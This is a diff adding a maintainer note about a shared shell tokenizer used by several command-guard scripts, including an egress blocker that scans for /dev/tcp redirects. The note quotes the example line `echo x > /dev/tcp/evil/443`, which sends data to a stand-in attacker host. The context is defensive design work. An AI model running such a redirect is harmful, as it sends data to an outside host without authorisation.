@@ -214,6 +214,15 @@
   pin for "a human or a future build with live CI feedback" to fix — that assumption was wrong,
   not a real sandbox constraint. Before deferring a lookup (a digest, a release version, an
   upstream API shape) as unverifiable, try the live request first.
+- **`pieces()`/`_split_pieces()` is shared by every rail, but its consumers don't all want the same
+  view of a redirect** (#359): block-egress.py's `/dev/tcp` scan needs a redirect's TARGET token
+  (`echo x > /dev/tcp/evil/443`) to survive in the yielded argv, while block-destructive-git.py's
+  `_push_force_hit`/`_push_dest_branch` and block-checkout-held-branch.py's `checkout_target` need
+  a redirect operator AND its target gone so it can't inflate their `len(positionals)` gates. Before
+  changing what the shared BASE tokenizer yields, check every other caller of `pieces()`/
+  `_split_pieces()` — if callers disagree about the wanted transformation, add an opt-in helper
+  (`strip_redirects()`) that only the callers who want it apply, rather than baking the change into
+  the shared base every rail gets.
 - **A "live-verified" mapping doesn't need a live MCP session** (#348): the Cloudflare tool-name
   mapping in settings.README.md was already confirmed from the plugin's own `.mcp.json` and its
   upstream server's source/README, not from a connected `/mcp` session — that's an accepted
